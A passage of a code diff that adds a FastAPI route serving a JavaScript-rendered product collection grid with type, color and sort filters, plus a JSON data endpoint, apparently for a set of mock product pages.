+          addOptions(colorFilter, payload.filters.color);
+          addOptions(sortSelect, payload.collection.sort_options);
+          [typeFilter, colorFilter, sortSelect].forEach((control) => {
+            control.addEventListener("change", renderGrid);
+          });
+          renderGrid();
+        });
+    </script>
+    """
+    return html_page("Product collection - JavaScript rendered grid", body, head=product_page_head(), script=script)
+
+
+@app.get("/product-pages/javascript-rendered-grid/data.json")
+async def product_javascript_rendered_grid_data():
+    return JSONResponse(product_collection_grid_payload())
 
 
 @app.get("/product-pages/laptop-configurator", response_class=HTMLResponse)
